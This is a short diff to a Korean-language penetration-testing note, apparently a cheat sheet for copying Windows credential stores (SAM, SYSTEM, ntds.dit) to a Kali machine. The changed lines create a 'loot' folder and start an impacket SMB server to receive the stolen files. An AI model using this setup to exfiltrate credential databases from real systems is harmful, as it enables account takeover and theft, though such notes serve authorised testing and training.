@@ -9,7 +9,8 @@ SAM, SYSTEM, ntds.dit, 크리덴셜 파일 등을 칼리로 가져오는 방법.
 ## SMB 공유로 업로드
 
 ```bash
-# 칼리에서 공유 시작
+# 칼리에서 리스너 서버 실행
+mkdir /tmp/loot
 impacket-smbserver share /tmp/loot -smb2support
 ```
 
